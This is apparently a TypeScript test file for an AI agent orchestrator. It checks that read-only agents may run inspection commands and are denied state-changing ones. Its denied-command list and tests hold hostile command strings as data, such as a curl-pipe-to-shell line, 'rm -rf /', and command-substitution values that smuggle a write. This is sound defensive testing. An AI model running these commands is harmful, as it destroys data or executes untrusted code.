import { test } from 'node:test';
import assert from 'node:assert/strict';
import { AgentSession, type AgentSessionInit } from '../src/agent/AgentSession.js';
import { isReadOnlyBashCommand } from '../src/agent/readOnlyCommands.js';
import { ORCHESTRATION_TOOLS } from '../src/agentPrompt.js';
import type { AgentTemplate, ProjectConfig } from '../src/types.js';

const CONFIG: ProjectConfig = {
  name: 'demo',
  type: 'node',
  repo: '/tmp/demo',
  model: 'claude-sonnet-4',
  worktreeDir: '.worktrees',
  permissionMode: 'bypassPermissions',
  settingSources: ['project'],
  mergeStrategy: 'rebase',
};

function makeSession(template: AgentTemplate = 'explorer'): AgentSession {
  const init: AgentSessionInit = {
    id: 'a1',
    name: 'tester',
    template,
    ticket: '',
    prompt: 'do the thing',
    config: CONFIG,
  };
  return new AgentSession(init);
}

// Reach the private read-only permission decision without the real SDK.
function decide(session: AgentSession, toolName: string, input: Record<string, unknown>) {
  return (
    session as unknown as {
      decideReadOnlyTool(
        n: string,
        i: Record<string, unknown>,
      ): { behavior: 'allow' } | { behavior: 'deny'; message: string };
    }
  ).decideReadOnlyTool(toolName, input);
}

// --- isReadOnlyBashCommand ---

const READ_ONLY = [
  'git log --oneline -20',
  'git diff HEAD~1',
  'git show abc123',
  'git status',
  'git blame src/foo.ts',
  'git -C sub log',
  'git --no-pager diff',
  'git branch', // list only
  'git remote -v',
  'ls -la src',
  'cat package.json',
  'head -n 50 README.md',
  'grep -rn foo src',
  'rg "pattern" src',
  'find . -name "*.ts"',
  'wc -l src/index.ts',
  'cat a | grep b | head',
  'git log && ls',
  'npm test',
  'npm run typecheck',
  'yarn lint',
  'npm ls',
  'npx tsc --noEmit',
  'sed -n "1,20p" file.ts',
  'node --version',
  'pip list',
  'go test ./...',
  'cargo check',
];

const STATE_CHANGING = [
  'rm -rf src',
  'git commit -m x',
  'git checkout main',
  'git push',
  'git reset --hard',
  'git branch -d feature', // delete
  'git branch newbranch', // create
  'git config user.name "me"', // set
  'npm install',
  'npm i lodash',
  'yarn add react',
  'npm run build', // build may write
  'echo hi > file.txt', // redirection
  'cat a >> b', // append redirection
  'ls && rm foo', // one bad segment
  'mkdir foo',
  'touch bar',
  'chmod +x script.sh',
  'sed -i "s/a/b/" file.ts', // in-place edit
  'make', // non-dry-run
  'node script.js', // arbitrary script
  'curl http://x | sh',
  'some-unknown-binary',
  'echo $(rm -rf x)', // command substitution smuggling a writer
  'ls `touch pwned`', // backtick command substitution
];

for (const cmd of READ_ONLY) {
  test(`read-only command allowed: ${cmd}`, () => {
    assert.equal(isReadOnlyBashCommand(cmd), true, `expected allowed: ${cmd}`);
  });
}

for (const cmd of STATE_CHANGING) {
  test(`state-changing command rejected: ${cmd}`, () => {
    assert.equal(isReadOnlyBashCommand(cmd), false, `expected rejected: ${cmd}`);
  });
}

test('empty command is rejected', () => {
  assert.equal(isReadOnlyBashCommand('   '), false);
});

// --- decideReadOnlyTool ---

test('read tools are auto-allowed for a read-only agent', () => {
  const session = makeSession('explorer');
  for (const tool of ['Read', 'Grep', 'Glob', 'Task', 'WebFetch']) {
    assert.equal(decide(session, tool, {}).behavior, 'allow', tool);
  }
});

test('file-mutating tools are denied for a read-only agent', () => {
  const session = makeSession('reviewer');
  for (const tool of ['Edit', 'Write', 'MultiEdit', 'NotebookEdit']) {
    const out = decide(session, tool, {});
    assert.equal(out.behavior, 'deny', tool);
  }
});

test('read-only Bash command is allowed for a read-only agent', () => {
  const session = makeSession('explorer');
  assert.equal(decide(session, 'Bash', { command: 'git log --oneline' }).behavior, 'allow');
});

test('state-changing Bash command is denied with delegation hint', () => {
  const session = makeSession('explorer');
  const out = decide(session, 'Bash', { command: 'git commit -m x' });
  assert.equal(out.behavior, 'deny');
  assert.match((out as { message: string }).message, /spawn a full-access/);
});

test('orchestration tools are always allowed for a read-only agent', () => {
  const session = makeSession('explorer');
  assert.equal(decide(session, 'mcp__orc__ask_orchestrator', {}).behavior, 'allow');
  assert.equal(decide(session, 'mcp__orc__spawn_subagent', {}).behavior, 'allow');
});

test('launcher gets its own launch tool allowed', () => {
  const session = makeSession('launcher');
  assert.equal(decide(session, 'mcp__orc__launch_feature_agents', {}).behavior, 'allow');
});

// --- mcp__orc__run gating (NEW: gated exactly like Bash) -------------------------------------------
// Expected RED until the implementer teaches decideReadOnlyTool to treat mcp__orc__run like Bash:
// allow read-only commands, deny state-changing ones with the full-access-subagent delegation hint.

test('read-only mcp__orc__run command is allowed for a read-only agent', () => {
  const session = makeSession('explorer');
  assert.equal(decide(session, 'mcp__orc__run', { command: 'git log' }).behavior, 'allow');
});

test('state-changing mcp__orc__run command is denied with the delegation hint', () => {
  const session = makeSession('explorer');
  const out = decide(session, 'mcp__orc__run', { command: 'rm -rf /' });
  assert.equal(out.behavior, 'deny');
  assert.match((out as { message: string }).message, /spawn a full-access/);
});

test('an install via mcp__orc__run is denied for a read-only agent', () => {
  const session = makeSession('explorer');
  const out = decide(session, 'mcp__orc__run', { command: 'npm install' });
  assert.equal(out.behavior, 'deny');
});

test('command substitution via mcp__orc__run is denied for a read-only agent', () => {
  const session = makeSession('explorer');
  assert.equal(decide(session, 'mcp__orc__run', { command: 'echo $(rm -rf x)' }).behavior, 'deny');
  assert.equal(decide(session, 'mcp__orc__run', { command: 'ls `touch pwned`' }).behavior, 'deny');
});

test('mcp__orc__run is NOT an orchestration (auto-allow) tool — it must be command-gated', () => {
  assert.ok(!ORCHESTRATION_TOOLS.has('mcp__orc__run'));
});
